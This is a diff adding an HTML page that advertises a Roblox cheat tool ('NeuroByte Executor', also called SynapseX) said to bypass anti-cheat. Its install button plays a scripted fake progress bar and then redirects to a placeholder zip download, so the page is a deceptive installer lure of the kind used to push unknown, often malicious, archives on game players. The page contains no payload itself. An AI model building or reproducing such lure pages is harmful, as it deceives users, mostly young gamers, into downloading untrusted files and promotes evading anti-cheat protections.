@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>SynapseX Installer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Consolas', monospace;
+      background: #0d0d0d;
+      color: #00ffcc;
+    }
+    header {
+      background: #111;
+      color: #0ff;
+      padding: 20px;
+      text-align: center;
+      border-bottom: 2px solid #00ffcc;
+    }
+    main {
+      max-width: 700px;
+      margin: 50px auto;
+      background: #1a1a1a;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px #00ffcc33;
+    }
+    h1, h2 {
+      margin-top: 0;
+      color: #00ffff;
+    }
+    p, li {
+      color: #c2fff9;
+    }
+    ul {
+      padding-left: 20px;
+    }
+    button {
+      background: #00ffcc;
+      color: black;
+      padding: 14px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 30px;
+      font-family: Consolas, monospace;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: #00c2a6;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+    .modal-content {
+      background: #111;
+      padding: 30px;
+      border-radius: 10px;
+      width: 360px;
+      text-align: center;
+      box-shadow: 0 0 25px #00ffcc66;
+      border: 1px solid #00ffcc88;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #00ffcc44;
+      border-top: 5px solid #00ffcc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .progress {
+      width: 100%;
+      background: #222;
+      height: 22px;
+      border-radius: 11px;
+      overflow: hidden;
+      margin: 20px 0;
+      box-shadow: inset 0 0 8px #00ffcc44;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #00ffcc, #00c2ff);
+      transition: width 0.4s ease;
+    }
+    #fase {
+      color: #00ffcc;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>NeuroByte Executor</h1>
+  <p>Roblox Automatic Installer | Latest Updated Version</p>
+</header>
+
+<main>
+  <h2>What is Synapse?</h2>
+  <p>NeuroByte Executor is the first exploit that has managed to bypass Roblox's new anti-cheat</p>
+
+  <h2>Characteristics:</h2>
+  <ul>
+    <li>Advanced Script Executor</li>
+    <li>Bypass anti-cheat</li>
+  </ul>
+  <button onclick="avviaInstallazione()">Install Now</button>
+</main>
+
+<div class="modal" id="modalInstallazione">
+  <div class="modal-content">
+    <div class="spinner"></div>
+    <div class="progress">
+      <div class="progress-bar" id="barra"></div>
+    </div>
+    <p id="fase">Preparing...</p>
+    <button onclick="chiudiInstallazione()">Chiudi</button>
+  </div>
+</div>
+
+<script>
+  function avviaInstallazione() {
+    const modal = document.getElementById('modalInstallazione')
+    const barra = document.getElementById('barra')
+    const fase = document.getElementById('fase')
+    modal.style.display = 'flex'
+    const messaggi = [
+      'Loading.',
+      'Loading..',
+      'Loading...',
+      'Loading.',
+      'Loading..',
+      'Downloading...'
+    ]
+    let i = 0
+    let progresso = 0
+    const intervallo = setInterval(() => {
+      if (i < messaggi.length) {
+        fase.innerText = messaggi[i]
+        progresso += 100 / messaggi.length
+        barra.style.width = progresso + '%'
+        i++
+      } else {
+        clearInterval(intervallo)
+        setTimeout(() => {
+          window.location.href = 'https://tuosito.com/download/SynapseX_Installer.zip'
+        }, 1000)
+      }
+    }, 1200)
+  }
+
+  function chiudiInstallazione() {
+    document.getElementById('modalInstallazione').style.display = 'none'
+  }
+</script>
+
+</body>
+</html>
